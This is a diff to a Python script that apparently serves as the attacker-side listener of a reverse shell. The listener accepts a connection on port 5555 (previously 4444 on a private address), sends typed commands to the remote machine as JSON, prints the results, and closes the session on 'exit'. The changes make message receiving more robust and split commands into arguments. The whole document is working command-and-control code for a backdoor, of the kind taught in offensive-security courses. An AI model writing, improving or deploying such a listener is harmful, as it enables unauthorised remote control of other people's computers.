@@ -16,20 +16,32 @@ class Listener :
         self.connection.send(json_data.encode())
 
     def reliable_receive(self):
-        json_data = self.connection.recv(4096)
-        return json.loads(json_data.decode())
-
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(4096).decode()
+                return json.loads(json_data)
+            except json.JSONDecodeError as e:
+                print(f"JSON decode error: {e}")
+                continue
+            
     def execute_remotely(self, command):
         self.reliable_send(command)
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
+
+        
         return self.reliable_receive()
     
     def run(self):
         while True:
             command = input(">>")
+            command = command.split(" ")
             result = self.execute_remotely(command)
             print(result, end="")
 
-my_listener = Listener("172.25.247.219" , 4444 )
+my_listener = Listener("0.0.0.0" , 5555)
 my_listener.run()
 
 
